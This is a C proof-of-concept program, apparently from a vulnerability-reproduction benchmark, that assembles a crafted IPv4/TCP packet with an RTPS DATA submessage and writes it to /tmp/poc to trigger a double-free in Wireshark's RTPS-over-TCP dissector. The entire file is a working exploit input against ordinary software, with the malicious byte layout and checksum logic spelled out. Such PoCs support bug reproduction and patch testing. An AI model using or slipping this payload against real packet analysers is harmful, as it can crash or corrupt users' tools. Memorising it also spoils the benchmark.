/*
 * PoC for arvo:26952
 * Triggers: double-free in wmem_simple_free_all (Wireshark RTPS-over-TCP dissector)
 * Vuln class: double_free
 *
 * Binary format: [20-byte IPv4 header][20-byte TCP header (dport=7400, flags=PSH+ACK)]
 *                [4-byte BE RTPS length prefix][RTPS header v2.4 vendor=RTI]
 *                [SUBMESSAGE_DATA id=0x15 flags=0x01 writerEntityId=0x000100c2]
 */

static uint16_t checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;
    for (size_t i = 0; i + 1 < len; i += 2)
        sum += (uint16_t)((data[i] << 8) | data[i+1]);
    if (len & 1) sum += (uint16_t)(data[len-1] << 8);
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

int main(void) {
    uint8_t pkt[256];
    memset(pkt, 0, sizeof(pkt));

    /* RTPS message */
    uint8_t rtps[] = {
        0x52,0x54,0x50,0x53,  /* magic 'RTPS' */
        0x02,0x04,             /* version 2.4 */
        0x01,0x01,             /* vendor RTI DDS */
        0x01,0x0f,0xbe,0x09,0x00,0x00,0x00,0x00,  /* guidPrefix (12 bytes) */
        0x00,0x00,0x00,0x00,
        /* SUBMESSAGE_DATA */
        0x15,                  /* submessage id: DATA */
        0x01,                  /* flags: little-endian */
        0x1c,0x00,             /* submessage length (28 bytes LE) */
        0x00,0x00,             /* extraFlags */
        0x10,0x00,             /* octetsToInlineQos = 16 */
        0x00,0x00,0x00,0x00,   /* readerEntityId = ENTITYID_UNKNOWN */
        0x00,0x01,0x00,0xc2,   /* writerEntityId = ENTITYID_BUILTIN_PARTICIPANT_WRITER */
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,  /* writerSeqNumber */
        0x00,0x03,0x00,0x00,   /* PL_CDR_LE encapsulation */
        0x50,0x00,0x10,0x00,   /* PID_PARTICIPANT_GUID, length=16 */
        0x01,0x0f,0xbe,0x09,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x01,0xc1,0x00
    };
    size_t rtps_len = sizeof(rtps);

    /* 4-byte BE length prefix for RTPS-over-TCP framing */
    uint8_t tcp_payload[4 + sizeof(rtps)];
    tcp_payload[0] = (rtps_len >> 24) & 0xff;
    tcp_payload[1] = (rtps_len >> 16) & 0xff;
    tcp_payload[2] = (rtps_len >>  8) & 0xff;
    tcp_payload[3] = (rtps_len      ) & 0xff;
    memcpy(tcp_payload + 4, rtps, rtps_len);
    size_t tcp_payload_len = sizeof(tcp_payload);

    /* IPv4 header (20 bytes) */
    uint16_t total_len = 20 + 20 + (uint16_t)tcp_payload_len;
    uint8_t ip[20] = {
        0x45, 0x00,
        (total_len >> 8) & 0xff, total_len & 0xff,
        0x00, 0x01, 0x40, 0x00,  /* id, flags+frag */
        0x40, 0x06, 0x00, 0x00,  /* TTL=64, proto=TCP, checksum=0 (fill below) */
        0x7f, 0x00, 0x00, 0x01,  /* src: 127.0.0.1 */
        0x7f, 0x00, 0x00, 0x01   /* dst: 127.0.0.1 */
    };
    uint16_t ip_csum = checksum(ip, 20);
    ip[10] = (ip_csum >> 8) & 0xff;
    ip[11] = ip_csum & 0xff;

    /* TCP header (20 bytes) */
    uint16_t tcp_seg_len = 20 + (uint16_t)tcp_payload_len;
    uint8_t tcp[20] = {
        0x1c, 0xe9,              /* src port 7401 */
        0x1c, 0xe8,              /* dst port 7400 */
        0x00, 0x00, 0x00, 0x01,  /* seq */
        0x00, 0x00, 0x00, 0x00,  /* ack */
        0x50, 0x18,              /* data offset=5, flags=PSH+ACK */
        0xff, 0xff,              /* window */
        0x00, 0x00,              /* checksum (fill below) */
        0x00, 0x00               /* urgent */
    };
    /* TCP pseudo-header checksum */
    uint8_t pseudo[12 + 20 + 128];
    memcpy(pseudo,      ip + 12, 4);  /* src ip */
    memcpy(pseudo + 4,  ip + 16, 4);  /* dst ip */
    pseudo[8] = 0x00;
    pseudo[9] = 0x06;                 /* proto TCP */
    pseudo[10] = (tcp_seg_len >> 8) & 0xff;
    pseudo[11] = tcp_seg_len & 0xff;
    memcpy(pseudo + 12, tcp, 20);
    memcpy(pseudo + 32, tcp_payload, tcp_payload_len);
    uint16_t tcp_csum = checksum(pseudo, 12 + 20 + tcp_payload_len);
    tcp[16] = (tcp_csum >> 8) & 0xff;
    tcp[17] = tcp_csum & 0xff;

    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    fwrite(ip,          1, 20,              f);
    fwrite(tcp,         1, 20,              f);
    fwrite(tcp_payload, 1, tcp_payload_len, f);
    fclose(f);
    return 0;
}
